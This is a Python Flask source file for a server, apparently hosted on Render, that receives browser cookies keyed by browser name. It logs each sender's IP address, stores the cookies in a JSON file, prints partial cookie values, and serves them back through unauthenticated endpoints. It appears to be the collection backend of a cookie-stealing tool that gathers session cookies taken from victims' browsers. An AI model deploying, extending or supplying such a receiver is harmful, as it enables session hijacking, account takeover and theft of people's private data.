from flask import Flask, request, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)

STORAGE_FILE = "cookies_store.json"

# ============================================================
#   Load/Save
# ============================================================
def load_store():
    if os.path.exists(STORAGE_FILE):
        with open(STORAGE_FILE, "r") as f:
            return json.load(f)
    return {}

def save_store(data):
    with open(STORAGE_FILE, "w") as f:
        json.dump(data, f, indent=4)

# ============================================================
#   Routes
# ============================================================

@app.route("/", methods=["GET"])
def index():
    store = load_store()
    return jsonify({
        "status": "online",
        "message": "Cookie Backend Running on Render",
        "total_entries": len(store)
    })


@app.route("/submit_cookies", methods=["POST"])
def submit_cookies():
    store = load_store()
    data = request.get_json(silent=True)

    if not data or "cookies" not in data:
        return jsonify({
            "success": False,
            "error": "Missing 'cookies' key"
        }), 400

    cookies = data["cookies"]
    found = {k: v for k, v in cookies.items() if v}

    if not found:
        return jsonify({
            "success": False,
            "error": "No valid cookies submitted"
        }), 400

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    store[timestamp] = {
        "cookies": found,
        "ip": request.remote_addr,
        "count": len(found)
    }

    save_store(store)

    print(f"\n[{timestamp}] Cookies received from {request.remote_addr}")
    for browser, value in found.items():
        preview = value[:10] + "..." + value[-10:] if len(value) > 20 else value
        print(f"  [{browser}] {preview}")

    return jsonify({
        "success": True,
        "message": f"Received {len(found)} cookie(s)",
        "timestamp": timestamp
    })


@app.route("/get_cookies", methods=["GET"])
def get_cookies():
    store = load_store()
    return jsonify({
        "success": True,
        "total_entries": len(store),
        "data": store
    })


@app.route("/get_latest", methods=["GET"])
def get_latest():
    store = load_store()

    if not store:
        return jsonify({
            "success": False,
            "error": "No cookies stored yet"
        }), 404

    latest_key = sorted(store.keys())[-1]
    return jsonify({
        "success": True,
        "timestamp": latest_key,
        "data": store[latest_key]
    })


@app.route("/clear_cookies", methods=["DELETE"])
def clear_cookies():
    save_store({})
    return jsonify({
        "success": True,
        "message": "All cookies cleared."
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
